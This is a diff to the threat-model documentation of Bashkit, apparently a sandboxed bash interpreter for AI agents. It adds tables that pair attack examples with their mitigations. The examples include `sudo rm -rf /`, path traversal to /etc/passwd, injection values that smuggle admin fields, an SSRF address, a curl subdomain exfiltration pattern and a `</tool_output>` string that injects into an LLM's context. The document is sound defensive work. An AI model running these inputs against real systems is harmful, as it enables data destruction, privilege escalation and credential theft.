@@ -139,6 +139,20 @@ let bash = Bash::builder()
 # }
 ```
 
+**Additional DoS hardening:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| jq file-binding amplification (TM-DOS-062) | Repeated `--rawfile`/`--slurpfile` of one max-size VFS file | `MAX_FILE_VAR_REQUESTS` + cumulative `MAX_FILE_VAR_BYTES` caps | MITIGATED |
+| Heredoc suffix re-injection (TM-DOS-064) | Many `: <<E && : <<E …` on one line | Re-injected suffix charged to `max_parser_operations` fuel | MITIGATED |
+| Command-substitution OOM (TM-DOS-088) | Deeply nested `$()` clones state | Dedicated `max_subst_depth` (default 32) | FIXED |
+| Command-substitution stack overflow (TM-DOS-089) | ~20-30 nested `$()` levels | `Box::pin` expansion/subst caps per-level stack | FIXED |
+| `shuf` range/repeat materialization (TM-DOS-090) | Huge `--input-range`/`--head-count` | Sample without full collection; reject oversized ranges | FIXED |
+| SQLite `.dump` output bypass (TM-DOS-091) | `.dump` builds full string before the cap check | `bounded_append()` enforces `max_output_bytes` per row | FIXED |
+| Subshell snapshot amplification (TM-DOS-092) | Deeply nested `( … )` | `max_subshell_depth` counter (default 32) | MITIGATED |
+| jq unbounded generator (TM-DOS-093) | `jq -n 'repeat(1)'` / `range(0;1e18)` | Cap output at `max_stdout_bytes`; poll deadline every 4096 values | FIXED |
+| Persistent history memory DoS (TM-DOS-094) | Unbounded command history in long-lived instances | `ExecutionLimits` caps history entries/bytes/output | FIXED |
+
 ### Sandbox Escape (TM-ESC-*)
 
 Scripts may attempt to break out of the sandbox to access the host system.
@@ -173,6 +187,7 @@ Scripts may attempt to break out of the sandbox to access the host system.
 | sudo/su (TM-ESC-009) | `sudo rm -rf /` | Not implemented | MITIGATED |
 | setuid (TM-ESC-010) | Permission changes | Virtual FS, no real perms | MITIGATED |
 | Capability abuse (TM-ESC-011) | Linux capabilities | Runs in-process | MITIGATED |
+| Mount-rw exposure to untrusted automation (TM-ESC-030) | Running untrusted scripts with `--mount-rw /` | CLI docs mark `--mount-rw` sandbox-breaking; recommend `--mount-ro` when host access is needed | MITIGATED |
 
 **Virtual Filesystem:**
 
@@ -244,7 +259,19 @@ Scripts may attempt to leak sensitive information.
 |--------|---------------|------------|--------|
 | Fork-PR secret exfil (TM-INF-026) | Fork PR edits `examples/*.rs` or `build.rs` to read `$DOPPLER_TOKEN` / `$ANTHROPIC_API_KEY` from the runner env and exfiltrate; first-time-contributor approval gate runs the workflow from PR head, and `DOPPLER_TOKEN` is the master key to every other secret in the Doppler config | Three-layer fix in `.github/workflows/{ci,js,publish-js}.yml`: (1) fork-guard gates secret-using steps on `head.repo.fork != true`, (2) job-level secrets removed — each step sets only the tokens it needs, (3) `doppler run --only-secrets <KEY>` limits each invocation to the single secret the script reads. `ANTHROPIC_API_KEY` migrated off GH Actions secrets onto Doppler so `DOPPLER_TOKEN` is the only secret CI needs from GitHub | **FIXED** |
 
-For the complete catalogue of TM-INF-021..025 (jq env probe, ssh known_hosts leak, builtin stderr Debug shapes, host env via clap `Arg::env`, untrusted generated Rust in drift CI) see `specs/threat-model.md`.
+**Additional information-disclosure hardening:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Library Debug shapes leak via stderr (TM-INF-022) | `{:?}` dumps internal struct shapes into agent-visible stderr | Static scan forbids Debug formatting in builtins, plus per-tool leak tests and fuzz invariants | MITIGATED |
+| jq `halt`/`halt_error` exits the host process (TM-INF-023) | Filter calls `halt(N)` → `std::process::exit` | Upstream `halt` native stripped; safe replacement returns a jq error | MITIGATED |
+| Host env side-channel via clap `Arg::env` (TM-INF-024) | `ls` resolved `TABSIZE`/`TIME_STYLE` from host env | Codegen strips `.env(...)`; builtins read `ctx.env` only | MITIGATED |
+| Untrusted generated Rust in drift CI (TM-INF-025) | Malicious upstream `uu_app()` runs with a write token | Generator validates the emitted shape; drift workflow splits read/write privilege | FIXED |
+| Publish from unverified release refs (TM-INF-027) | Dispatch publish from a branch or unprotected tag | Dispatch requires `refs/heads/main`; publish gated on real `vX.Y.Z` tags | FIXED |
+| JS `onOutput` errors expose host stack traces (TM-INF-028) | Callback throws, leaking `error.stack` | Propagate `error.message` only; strip absolute/`file://` paths | FIXED |
+| Raw callback errors leak host internals (TM-INF-030) | Tool callback throws API keys/connection strings/stack traces | `sanitize_errors` defaults on for `ScriptedTool`/`ToolImpl` | MITIGATED |
+| `final_env` capture bypasses filtering/caps (TM-INF-031) | `capture_final_env` leaks internal markers or exceeds caps | Visibility filter + output-byte cap applied when building `final_env` | MITIGATED |
+| Stack backtrace disclosure (TM-INF-021) | Panics leak source paths, dep versions, function names via stderr | Custom panic hook suppresses backtraces in the CLI | MITIGATED |
 
 **Caller Responsibility (TM-INF-001):**
 
@@ -309,6 +336,12 @@ Network access is disabled by default. When enabled, strict controls apply.
 | Chunked bomb (TM-NET-012) | Infinite chunked response | Response size limit (streaming) | MITIGATED |
 | Compression bomb (TM-NET-013) | 10KB to 10GB gzip | Auto-decompression disabled | MITIGATED |
 | DNS rebind via redirect (TM-NET-014) | Redirect to rebinded IP | Redirect requires allowlist check | MITIGATED |
+| JSON body injection (TM-NET-018) | `http POST url name='x","admin":true'` | Build JSON via `serde_json`, not string formatting | MITIGATED |
+| Query param injection (TM-NET-019) | `http GET url q=='foo&admin=true'` | URL-encode via local x-www-form-urlencoded encoder | MITIGATED |
+| Form body injection (TM-NET-020) | `http --form url user='x&role=admin'` | URL-encode form fields | MITIGATED |
+| Bot identity spoofing (TM-NET-021) | Forge requests as a trusted bot | Ed25519 request signing (bot-auth feature, opt-in) | MITIGATED |
+| IPv4-mapped IPv6 SSRF bypass (TM-NET-022) | AAAA returns `::ffff:127.0.0.1` / metadata IP | `is_private_ip` normalizes v4-mapped/compatible v6 to v4 and applies the v4 classifier | FIXED |
+| HTTP-transport SSRF via fail-open precheck (TM-NET-023) | Malformed/no-host URL or rebind window bypasses the IP filter | Precheck fails closed on bad URLs; transports receive pinned addresses + `is_private_ip` | MITIGATED |
 
 **Credential Injection (TM-NET-024–027):**
 
@@ -418,6 +451,8 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 | unset removes readonly (TM-INJ-019) | `readonly X=v; unset X` | Check readonly attribute in unset | **MITIGATED** |
 | declare overwrites readonly (TM-INJ-020) | `readonly X=v; declare X=new` | Check readonly attribute in declare | **MITIGATED** |
 | export overwrites readonly (TM-INJ-021) | `readonly X=v; export X=new` | Check readonly attribute in export | **MITIGATED** |
+| XML boundary break via tool output (TM-INJ-022) | Script emits `</tool_output>` to inject into LLM context | Escape `&`/`<`/`>` before wrapping output (`sanitizeOutput`) | MITIGATED |
+| Template injection via `#each` data (TM-INJ-023) | Data values contain `{{`/`#each` markers | Template markers escaped in data before interpolation | MITIGATED |
 
 **Variable Expansion:**
 
@@ -457,6 +492,7 @@ echo $user_input
 | EXIT trap cross-exec leak (TM-ISO-021) | EXIT trap fires in next `exec()` | Reset traps in `reset_for_execution()` | **MITIGATED** |
 | `$?` cross-exec leak (TM-ISO-022) | Exit code from previous `exec()` visible | Reset `last_exit_code` | **MITIGATED** |
 | `set -e` cross-exec leak (TM-ISO-023) | Shell options persist across `exec()` | Reset shell options | **MITIGATED** |
+| `$?` leaks into VFS subprocess (TM-ISO-024) | Parent `last_exit_code` visible in child, causing false `set -e` failures | Child resets `last_exit_code`, `nounset_error`, and traps | **MITIGATED** |
 
 Each [`Bash`] instance is fully isolated. For multi-tenant environments, create
 separate instances per tenant:
@@ -598,6 +634,17 @@ Python `pathlib.Path` and `open()` operations are bridged to Bashkit's virtual f
 | Config lost on reset (TM-PY-026) | reset() drops limits | Preserve config | **MITIGATED** |
 | JSON recursion (TM-PY-027) | Nested dicts overflow stack | Add depth limit | **MITIGATED** |
 | BashTool.reset() drops config (TM-PY-028) | reset() removes limits | Preserve config (match PyBash) | **MITIGATED** |
+| Silent failure masks script errors (TM-PY-007) | Syntax error swallowed | Syntax errors return a non-zero exit code | MITIGATED |
+| Exit-code spoofing across py/bash (TM-PY-008) | `sys.exit(N)` | Propagates N to bash `$?` | MITIGATED |
+| Degenerate input crash (TM-PY-009) | `python -c ''` | Empty code fails gracefully with an error | MITIGATED |
+| Error text leaks into pipeline (TM-PY-010) | Traceback into stdout | Tracebacks stay on stderr | MITIGATED |
+| Command-subst captures diagnostics (TM-PY-011) | `$(python …)` grabs stderr | Captures stdout only | MITIGATED |
+| Shell escape via `eval`/`exec` (TM-PY-012) | `eval("os.system(...)")` | Monty has no `os.system`/`subprocess`; eval'd code stays in the interpreter | MITIGATED |
+| Unknown CLI options smuggle behavior (TM-PY-013) | Unknown `python` flag | Rejected with exit 2 | MITIGATED |
+| Escapes Bashkit resource limits (TM-PY-014) | Bypass caps via Python | `ExecutionLimits` apply like any builtin | MITIGATED |
+| Host clock disclosure (TM-PY-029) | `datetime.now()` exposes host time/timezone | Intentional — required for correct datetime semantics | ACCEPTED |
+| GIL deadlock/exit crash via async callback (TM-PY-030) | Private-loop dispatch holds the GIL during teardown | Deterministic teardown: detach around dispatch, cancel in-flight callbacks, no attach at finalization | FIXED |
+| ContextVar capture may include sensitive state (TM-PY-031) | `copy_context()` snapshots all caller ContextVars | Accepted: same semantics as `asyncio.Task` inheritance; caller controls what is set | ACCEPTED |
 
 **Architecture:**
 
@@ -679,6 +726,7 @@ to the virtual filesystem.
 | SSH key access (TM-GIT-012) | Use host SSH keys | HTTPS only (no SSH) | PLANNED |
 | Git protocol bypass (TM-GIT-013) | Use `git://` protocol | HTTPS only | PLANNED |
 | Branch name injection (TM-GIT-014) | `git branch ../../config` | Validate branch names | **MITIGATED** |
+| Terminal-escape injection via git metadata (TM-GIT-015) | Control chars in config/author/commit echoed by `git config`/`git log` | Control characters stripped on output | **MITIGATED** |
 
 **Virtual Identity:**
 
@@ -726,9 +774,23 @@ access is bridged through Bashkit's VFS — never the host filesystem.
 | Path traversal (TM-TS-007) | `../../etc/passwd` | Paths resolved within sandbox | MITIGATED |
 | Host `/tmp` escape (TM-TS-011) | Operations escape to host | All operations through Bashkit VFS | MITIGATED |
 | Limit bypass (TM-TS-018) | Evade Bashkit caps via TS | Command budget still enforced | MITIGATED |
+| Bash/TS VFS data corruption (TM-TS-008) | Cross-tenant VFS access | Shared VFS by design; no cross-tenant access | MITIGATED |
+| Crash on missing file (TM-TS-009) | Open a missing file | Error string returned, not a panic | MITIGATED |
+| VFS mkdir escape (TM-TS-010) | mkdir outside VFS | mkdir operates only in VFS | MITIGATED |
+| Error info leak via stdout (TM-TS-012) | Errors to stdout | Errors go to stderr, not stdout | MITIGATED |
+| Syntax error crashes host (TM-TS-013) | Malformed TS | Non-zero exit, error on stderr | MITIGATED |
+| Exit code not propagated (TM-TS-014) | `process.exit(N)` | Exit code flows to bash `$?` | MITIGATED |
+| Empty code crashes (TM-TS-015) | `ts -c ''` | Non-zero exit, error message | MITIGATED |
+| Pipeline error leakage (TM-TS-016) | Errors into pipe | Errors on stderr, not passed to the pipe | MITIGATED |
+| Unknown options accepted (TM-TS-017) | Unknown flag | Unknown flags return non-zero | MITIGATED |
+| Command-subst captures errors (TM-TS-019) | `$(ts …)` grabs stderr | Only stdout captured | MITIGATED |
+| Shell execution from TS (TM-TS-021) | `child_process` / exec globals | No process/subprocess/exec globals | MITIGATED |
+| Script reads host filesystem (TM-TS-022) | Load a host script | Script file loaded via VFS | MITIGATED |
+| Shebang line injection (TM-TS-023) | `#!...` header | Shebang stripped safely | MITIGATED |
+| Bash var expansion injection (TM-TS-020) | Unquoted `$VAR` expanded before TS runs | By design; use single quotes to prevent expansion | MITIGATED |
 
-Full per-threat coverage (TM-TS-001 … TM-TS-020), including error-isolation and
-exit-code propagation cases, lives in the spec and the `threat_ts_*` tests.
+Per-threat coverage (TM-TS-001 … TM-TS-023), including error-isolation and
+exit-code propagation cases, is also exercised by the `threat_ts_*` tests.
 
 ### Request Signing & Snapshot Integrity (TM-CRY-*, TM-SNAP-*)
 
@@ -867,6 +929,7 @@ All threats use stable IDs in the format `TM-<CATEGORY>-<NUMBER>`:
 | TM-INF | Information Disclosure |
 | TM-INJ | Injection |
 | TM-NET | Network Security |
+| TM-AVAIL | Availability (fail-open auth) |
 | TM-ISO | Multi-Tenant Isolation |
 | TM-INT | Internal Error Handling |
 | TM-LOG | Logging Security |
